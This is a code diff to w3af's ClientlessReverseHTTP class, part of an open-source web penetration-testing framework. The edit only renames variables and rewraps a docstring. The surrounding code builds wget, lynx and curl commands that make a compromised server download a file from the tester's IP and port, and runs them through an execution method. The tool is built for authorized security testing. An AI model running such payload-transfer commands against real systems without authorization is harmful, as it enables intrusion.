@@ -40,11 +40,11 @@ class ClientlessReverseHTTP(BasePayloadTransfer):
         - lynx
     """
 
-    def __init__(self, exec_method, os, inboundPort):
+    def __init__(self, exec_method, os, inbound_port):
         super(ClientlessReverseHTTP, self).__init__(exec_method, os)
         self._exec_method = exec_method
         self._os = os
-        self._inbound_port = inboundPort
+        self._inbound_port = inbound_port
         self._command = None
 
     def can_transfer(self):
@@ -77,15 +77,15 @@ class ClientlessReverseHTTP(BasePayloadTransfer):
 
     def transfer(self, data_str, destination):
         """
-        This method is used to transfer the data_str from w3af to the compromised server.
+        This method is used to transfer the data_str from w3af to the
+        compromised server.
         """
         if not self._command:
             self.can_transfer()
 
-        commandTemplates = {}
-        commandTemplates['wget'] = 'wget http://%s:%s/%s -O %s'
-        commandTemplates['lynx'] = 'lynx -source http://%s:%s/%s > %s'
-        commandTemplates['curl'] = 'curl http://%s:%s/%s > %s'
+        cmd_templates = {'wget': 'wget http://%s:%s/%s -O %s',
+                         'lynx': 'lynx -source http://%s:%s/%s > %s',
+                         'curl': 'curl http://%s:%s/%s > %s'}
 
         # Create the file
         filename = rand_alpha(10)
@@ -100,10 +100,10 @@ class ClientlessReverseHTTP(BasePayloadTransfer):
                                   self._inbound_port,
                                   get_temp_dir())
 
-        commandToRun = commandTemplates[self._command] % \
+        cmd_to_run = cmd_templates[self._command] % \
             (cf.cf.get('local_ip_address'), self._inbound_port,
              filename, destination)
-        self._exec_method(commandToRun)
+        self._exec_method(cmd_to_run)
 
         os.remove(file_path)
 
